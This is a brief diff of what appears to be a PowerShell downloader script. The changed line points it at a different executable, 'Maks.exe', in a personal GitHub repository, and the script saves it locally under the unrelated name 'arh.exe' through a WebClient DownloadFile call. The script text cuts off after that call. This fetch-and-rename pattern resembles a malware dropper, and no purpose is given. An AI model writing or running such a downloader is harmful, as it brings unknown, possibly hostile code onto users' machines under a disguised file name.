@@ -1,4 +1,4 @@
-$url_file = 'http://raw.githubusercontent.com/MGrinx5/maks/refs/heads/main/Python.exe'
+$url_file = 'http://raw.githubusercontent.com/MGrinx5/maks/refs/heads/main/Maks.exe'
 $file = 'arh.exe'
 
 PowerShell (New-Object System.Net.WebClient).DownloadFile($url_file,$file),
